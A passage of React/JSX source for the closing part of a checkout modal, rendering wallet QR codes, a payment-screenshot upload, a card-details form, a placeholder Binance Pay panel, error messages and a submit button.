                            {method.qrBase64 && (
                              <div className="mt-3 flex flex-col items-center border-t border-slate-800 pt-3 bg-slate-950/40 -mx-5 -mb-5 p-4">
                                 <span className="text-xs text-slate-400 font-bold mb-2 flex items-center gap-1.5">
                                   Scan QR Code in {method.providerName} App
                                 </span>
                                 <div className="bg-white p-2 rounded-xl shadow-md">
                                   <img src={method.qrBase64} alt="QR Code" className="w-28 h-28 object-contain" />
                                  </div>
                              </div>
                            )}
                         </div>
                       ))}
                    </div>
                  ) : (
                    <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 text-center mb-6">
                       <h3 className="font-bold text-white mb-2">No Payment Methods Configured</h3>
                       <p className="text-slate-400 text-sm">Please contact support or configure payment accounts in admin.</p>
                    </div>
                  )}

                  <div className="mb-6">
                    <label className="block text-sm font-semibold mb-2 text-slate-300">Upload Payment Screenshot</label>
                    <label className={`w-full border-2 border-dashed ${proofBase64 ? 'border-green-500 bg-green-500/10' : status === 'processing' ? 'border-blue-500 bg-blue-500/10' : 'border-slate-700 hover:border-primary-500 hover:bg-slate-800/50'} rounded-2xl p-6 flex flex-col items-center justify-center cursor-pointer transition-colors min-h-[120px]`}>
                       {status === 'processing' ? (
                         <div className="flex flex-col items-center text-blue-500">
                           <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500 mb-2"></div>
                           <span className="font-medium text-sm">Processing Image...</span>
                         </div>
                       ) : proofBase64 ? (
                         <div className="flex flex-col items-center text-green-500">
                           <CheckCircle size={32} className="mb-2" />
                           <span className="font-medium text-sm">Image Uploaded</span>
                         </div>
                       ) : (
                         <div className="flex flex-col items-center text-slate-400 hover:text-primary-400">
                           <Upload size={32} className="mb-2" />
                           <span className="font-medium text-sm mb-1">Click to upload screenshot</span>
                           <span className="text-xs text-slate-500">JPG, PNG (Max 5MB)</span>
                         </div>
                       )}
                       <input type="file" accept="image/*" className="hidden" onChange={handleImageUpload} />
                    </label>
                  </div>
                </>
              )}

              {paymentMode === 'card' && (
                <div className="space-y-4 mb-6">
                   <div>
                      <label className="block text-sm font-semibold mb-1 text-slate-400">Cardholder Name</label>
                      <input type="text" placeholder="Name on Card" value={cardDetails.name} onChange={e => setCardDetails(prev => ({...prev, name: e.target.value}))} className="w-full bg-slate-950 border border-slate-800 text-white rounded-lg px-4 py-3 focus:ring-2 focus:ring-primary-500" />
                   </div>
                   <div>
                      <label className="block text-sm font-semibold mb-1 text-slate-400">Card Number</label>
                      <input type="text" placeholder="0000 0000 0000 0000" value={cardDetails.number} onChange={e => setCardDetails(prev => ({...prev, number: e.target.value}))} className="w-full bg-slate-950 border border-slate-800 text-white rounded-lg px-4 py-3 focus:ring-2 focus:ring-primary-500 font-mono tracking-widest" />
                   </div>
                   <div className="grid grid-cols-2 gap-4">
                      <div>
                         <label className="block text-sm font-semibold mb-1 text-slate-400">Expiry (MM/YY)</label>
                         <input type="text" placeholder="MM/YY" value={cardDetails.expiry} onChange={e => setCardDetails(prev => ({...prev, expiry: e.target.value}))} className="w-full bg-slate-950 border border-slate-800 text-white rounded-lg px-4 py-3 focus:ring-2 focus:ring-primary-500 font-mono" />
                      </div>
                      <div>
                         <label className="block text-sm font-semibold mb-1 text-slate-400">CVV</label>
                         <input type="password" placeholder="•••" value={cardDetails.cvv} onChange={e => setCardDetails(prev => ({...prev, cvv: e.target.value}))} className="w-full bg-slate-950 border border-slate-800 text-white rounded-lg px-4 py-3 focus:ring-2 focus:ring-primary-500 font-mono tracking-widest" />
                      </div>
                   </div>
                </div>
              )}

              {paymentMode === 'binance' && (
                <div className="bg-slate-800/50 border border-slate-700 rounded-2xl p-6 text-center mb-6">
                   <h3 className="font-bold text-white mb-2 text-xl">Binance Pay</h3>
                   <span className="inline-block bg-yellow-500 text-black text-xs font-bold px-3 py-1 rounded-full uppercase tracking-wider mb-2">Coming Soon</span>
                   <p className="text-slate-400 text-sm">Crypto payments using Binance Pay will be available shortly.</p>
                </div>
              )}

              {status === 'error' && (
                <div className="bg-primary-500/10 border border-primary-500/30 text-primary-500 rounded-lg p-3 text-sm mb-4">
                   Error placing order. Please try again.
                </div>
              )}

              {status === 'card_error' && (
                <div className="bg-primary-500/10 border border-primary-500/30 text-primary-500 rounded-lg p-3 text-sm mb-4 text-center font-bold">
                   Card service currently unavailable. Please use Easypaisa or JazzCash.
                </div>
              )}

              <button 
                disabled={paymentMode === 'binance' || (paymentMode === 'wallet' && !proofBase64) || (paymentMode === 'card' && (!cardDetails.number || !cardDetails.expiry || !cardDetails.cvv || !cardDetails.name)) || (!name || !email || !phone) || status === 'uploading' || status === 'processing'} 
                onClick={handleSubmitProof}
                className="w-full bg-primary-600 hover:bg-primary-500 disabled:opacity-50 disabled:hover:bg-primary-600 text-white font-bold py-4 rounded-xl transition-all shadow-lg shadow-primary-500/20 active:scale-[0.98] cursor-pointer"
              >
                 {status === 'uploading' ? 'Submitting...' : paymentMode === 'card' ? 'Pay Securely' : paymentMode === 'wallet' ? 'Submit Payment Proof' : 'Unavailable'}
              </button>
           </>
         )}
      </motion.div>
    </motion.div>
  )
}
